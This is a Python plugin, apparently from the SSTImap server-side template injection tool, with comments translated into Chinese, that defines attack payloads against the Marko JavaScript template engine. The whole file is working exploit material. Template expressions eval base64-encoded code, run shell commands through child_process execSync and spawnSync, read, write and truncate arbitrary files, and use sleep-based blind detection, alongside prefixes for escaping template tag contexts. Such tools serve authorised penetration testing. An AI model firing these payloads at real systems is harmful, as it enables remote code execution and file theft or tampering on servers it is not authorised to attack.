from plugins.languages import javascript
from utils import rand


class Marko(javascript.Javascript):
    generic_plugin = True
    priority = 5
    plugin_info = {
        "Description": 'Marko 模板引擎',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Homepage: https://markojs.com/",
            "Github: https://github.com/marko-js/marko",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '${{{header[0]}+{header[1]}}}',
                'trailer': '${{{trailer[0]}+{trailer[1]}}}',
                'test_render': f'${{typeof({rand.randints[0]})+{rand.randints[1]}}}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """${{''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}""",
            },
            'evaluate': {
                'evaluate': """${{eval(Buffer('{code_b64p}', 'base64').toString())}}"""
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """${{[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]}}"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """${{eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')}}"""
            },
            'execute': {
                'execute': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())}}"""
            },
            'execute_error': {
                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')}}"""
            },
            'write': {
                'call': 'inject',
                'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64p}','base64'),'binary')}}""",
                'truncate': """${{require('fs').writeFileSync('{path}','')}}"""
            },
            'read': {
                'call': 'render',
                'read': """${{require('fs').readFileSync('{path}').toString('base64')}}"""
            },
            'read_error': {
                'read': """require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': "${{require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')}}"
            },
            'md5_error': {
                'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '${"1"', 'closures': javascript.ctx_closures},
            # 如果转义需要知道结束标签，例如<div if(%s)></div>
            # 这是为了逃避 <var name=data/> 和 <assign name=data/>
            {'level': 2, 'prefix': '1/>', 'suffix': ''},
        ])
